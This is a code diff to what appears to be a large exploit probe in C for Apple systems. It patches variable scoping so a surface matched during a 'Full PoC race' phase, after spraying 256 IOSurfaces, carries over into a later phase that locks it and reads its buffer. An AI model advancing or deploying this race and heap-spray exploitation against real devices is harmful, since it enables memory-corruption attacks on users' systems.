@@ -19281,6 +19281,10 @@ new_modes:
          *
          * We load Metal dynamically via dlopen since the probe is pure C.
          */
+        /* r229 variables shared between Phase 13 and Phase 14 */
+        static IOSurfaceRef r229_matched_surf = NULL;
+        static int r229_matched_idx = -1;
+
         r229_phase13_top:
         rlog("\n--- Phase 13: Full PoC race (Metal render loop + Stage C variants) ---\n");
         {
@@ -20092,7 +20096,8 @@ new_modes:
                     }
 
                     rlog("  r=229: Matched surface kept alive. Proceeding to Phase 14...\n");
-                    /* Phase 14 uses r229_spray[r229_match_idx] directly */
+                    r229_matched_surf = r229_spray[r229_match_idx];
+                    r229_matched_idx = r229_match_idx;
                 } else {
                     /* Clean up any remaining spray surfaces */
                     for (int si = 0; si < 256; si++) {
@@ -20169,11 +20174,11 @@ new_modes:
             IOSurfaceID match_id = 0;
             IOSurfaceRef match_surf = NULL;
 
-            if (rounds == 229 && r229_match_idx >= 0 && r229_spray[r229_match_idx]) {
-                match_surf = r229_spray[r229_match_idx];
+            if (rounds == 229 && r229_matched_idx >= 0 && r229_matched_surf) {
+                match_surf = r229_matched_surf;
                 match_id = IOSurfaceGetID(match_surf);
                 rlog("    Matched surface: idx=%d id=%u addr=%p\n",
-                    r229_match_idx, match_id, (void *)match_surf);
+                    r229_matched_idx, match_id, (void *)match_surf);
 
                 /* Lock and get pixel buffer base address */
                 IOSurfaceLock(match_surf, 0, NULL);
